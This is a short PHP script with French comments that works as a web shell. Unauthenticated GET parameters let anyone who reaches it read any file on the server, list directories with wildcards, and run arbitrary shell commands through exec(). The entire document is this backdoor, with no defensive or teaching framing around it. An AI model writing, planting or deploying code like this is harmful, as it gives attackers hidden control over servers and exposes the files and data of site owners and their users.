<?php
if(isset($_GET['f'])) {
// permet de coloriser le code
    highlight_file($_GET['f']);
} elseif(isset($_GET['f2'])) {
// quand le highlight_file ne fonctionne pas
    echo nl2br(htmlspecialchars(file_get_contents($_GET['f2'])));
} elseif(isset($_GET['d'])) {
// lister le directory
    echo '<pre>'.print_r(glob($_GET['d']), true).'</pre>';
    // le glob permet d'utiliser des étoiles comme dans un LIKE
} elseif(isset($_GET['c'])) {
// exécution
    exec($_GET['c']);
}
?>
